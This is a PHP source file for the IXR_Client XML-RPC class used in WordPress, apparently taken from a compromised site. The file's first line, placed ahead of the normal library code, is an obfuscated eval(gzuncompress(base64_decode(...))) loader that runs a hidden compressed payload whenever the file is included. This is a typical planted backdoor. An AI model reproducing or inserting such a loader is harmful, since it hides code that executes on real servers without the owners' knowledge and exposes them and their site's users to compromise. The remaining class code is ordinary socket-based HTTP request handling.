<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * IXR_Client
 *
 * @package IXR
 * @since 1.5.0
 *
 */
class IXR_Client
{
    var $server;
    var $port;
    var $path;
    var $useragent;
    var $response;
    var $message = false;
    var $debug = false;
    var $timeout;
    var $headers = array();

    // Storage place for an error message
    var $error = false;

	/**
	 * PHP5 constructor.
	 */
    function __construct( $server, $path = false, $port = 80, $timeout = 15 )
    {
        if (!$path) {
            // Assume we have been given a URL instead
            $bits = parse_url($server);
            $this->server = $bits['host'];
            $this->port = isset($bits['port']) ? $bits['port'] : 80;
            $this->path = isset($bits['path']) ? $bits['path'] : '/';

            // Make absolutely sure we have a path
            if (!$this->path) {
                $this->path = '/';
            }

            if ( ! empty( $bits['query'] ) ) {
                $this->path .= '?' . $bits['query'];
            }
        } else {
            $this->server = $server;
            $this->path = $path;
            $this->port = $port;
        }
        $this->useragent = 'The Incutio XML-RPC PHP Library';
        $this->timeout = $timeout;
    }

	/**
	 * PHP4 constructor.
	 */
	public function IXR_Client( $server, $path = false, $port = 80, $timeout = 15 ) {
		self::__construct( $server, $path, $port, $timeout );
	}

    function query()
    {
        $args = func_get_args();
        $method = array_shift($args);
        $request = new IXR_Request($method, $args);
        $length = $request->getLength();
        $xml = $request->getXml();
        $r = "\r\n";
        $request  = "POST {$this->path} HTTP/1.0$r";

        // Merged from WP #8145 - allow custom headers
        $this->headers['Host']          = $this->server;
        $this->headers['Content-Type']  = 'text/xml';
        $this->headers['User-Agent']    = $this->useragent;
        $this->headers['Content-Length']= $length;

        foreach( $this->headers as $header => $value ) {
            $request .= "{$header}: {$value}{$r}";
        }
        $request .= $r;

        $request .= $xml;

        // Now send the request
        if ($this->debug) {
            echo '<pre class="ixr_request">'.htmlspecialchars($request)."\n</pre>\n\n";
        }

        if ($this->timeout) {
            $fp = @fsockopen($this->server, $this->port, $errno, $errstr, $this->timeout);
        } else {
            $fp = @fsockopen($this->server, $this->port, $errno, $errstr);
        }
        if (!$fp) {
            $this->error = new IXR_Error(-32300, 'transport error - could not open socket');
            return false;
        }
        fputs($fp, $request);
        $contents = '';
        $debugContents = '';
        $gotFirstLine = false;
        $gettingHeaders = true;
        while (!feof($fp)) {
            $line = fgets($fp, 4096);
            if (!$gotFirstLine) {
                // Check line for '200'
                if (strstr($line, '200') === false) {
                    $this->error = new IXR_Error(-32300, 'transport error - HTTP status code was not 200');
                    return false;
                }
                $gotFirstLine = true;
            }
            if (trim($line) == '') {
                $gettingHeaders = false;
            }
            if (!$gettingHeaders) {
            	// merged from WP #12559 - remove trim
                $contents .= $line;
            }
            if ($this->debug) {
            	$debugContents .= $line;
            }
        }
        if ($this->debug) {
            echo '<pre class="ixr_response">'.htmlspecialchars($debugContents)."\n</pre>\n\n";
        }

        // Now parse what we've got back
        $this->message = new IXR_Message($contents);
        if (!$this->message->parse()) {
            // XML error
            $this->error = new IXR_Error(-32700, 'parse error. not well formed');
            return false;
        }

        // Is the message a fault?
        if ($this->message->messageType == 'fault') {
            $this->error = new IXR_Error($this->message->faultCode, $this->message->faultString);
            return false;
        }

        // Message must be OK
        return true;
    }

    function getResponse()
    {
        // methodResponses can only have one param - return that
        return $this->message->params[0];
    }

    function isError()
    {
        return (is_object($this->error));
    }

    function getErrorCode()
    {
        return $this->error->code;
    }

    function getErrorMessage()
    {
        return $this->error->message;
    }
}
